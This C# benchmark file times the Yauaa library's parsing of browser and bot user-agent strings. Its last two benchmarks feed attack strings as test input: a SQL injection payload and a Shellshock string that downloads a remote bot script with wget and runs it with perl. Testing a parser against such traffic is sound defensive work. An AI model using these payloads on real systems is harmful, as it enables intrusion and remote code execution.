using BenchmarkDotNet.Attributes;
using OrbintSoft.Yauaa.Analyzer.Parse.UserAgentNS;

namespace OrbintSoft.Yauaa.NetCore.Benchmarks
{
    public class AnalyzerBenchmarks
    {
        private UserAgentAnalyzer uaa;

        [GlobalSetup]
        public void GlobalSetup()
        {
            uaa = UserAgentAnalyzer.NewBuilder()
                .WithoutCache()
                .HideMatcherLoadStats()
                .Build();
            uaa.Parse((string)null);
        }

        [Benchmark]
        public UserAgent Android6Chrome46()
        {
            return uaa.Parse("Mozilla/5.0 (Linux; Android 6.0; Nexus 6 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Chrome/46.0.2490.76 Mobile Safari/537.36");
        }

        [Benchmark]
        public UserAgent AndroidPhone()
        {
            return uaa.Parse("Mozilla/5.0 (Linux; Android 5.0.1; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36");
        }

        [Benchmark]
        public UserAgent Googlebot()
        {
            return uaa.Parse("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
        }

        [Benchmark]
        public UserAgent GoogleBotMobileAndroid()
        {
            return uaa.Parse("Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
        }

        [Benchmark]
        public UserAgent GoogleAdsBot()
        {
            return uaa.Parse("AdsBot-Google (+http://www.google.com/adsbot.html)");
        }

        [Benchmark]
        public UserAgent GoogleAdsBotMobile()
        {
            return uaa.Parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
                "Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)");
        }

        [Benchmark]
        public UserAgent IPhone()
        {
            return uaa.Parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
                "Version/9.0 Mobile/13F69 Safari/601.1");
        }

        [Benchmark]
        public UserAgent IPhoneFacebookApp()
        {
            return uaa.Parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
                "Mobile/13G34 [FBAN/FBIOS;FBAV/61.0.0.53.158;FBBV/35251526;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;" +
                "FBSV/9.3.3;FBSS/2;FBCR/vfnl;FBID/phone;FBLC/nl_NL;FBOP/5]");
        }

        [Benchmark]
        public UserAgent IPad()
        {
            return uaa.Parse("Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
                "Version/9.0 Mobile/13F69 Safari/601.1");
        }

        [Benchmark]
        public UserAgent Win7ie11()
        {
            return uaa.Parse("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
        }

        [Benchmark]
        public UserAgent Win10Edge13()
        {
            return uaa.Parse("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586");
        }

        [Benchmark]
        public UserAgent Win10Chrome51()
        {
            return uaa.Parse("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Chrome/51.0.2704.103 Safari/537.36");
        }

        [Benchmark]
        public UserAgent Win10IE11()
        {
            return uaa.Parse("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
        }

        [Benchmark]
        public UserAgent HackerSQL()
        {
            return uaa.Parse("-8434))) OR 9695 IN ((CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT " +
                "(CASE WHEN (9695=9695) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))) AND (((4283=4283");
        }

        [Benchmark]
        public UserAgent HackerShellShock()
        {
            return uaa.Parse("() { :;}; /bin/bash -c \\\"\"wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\\\"\"");
        }
    }
}
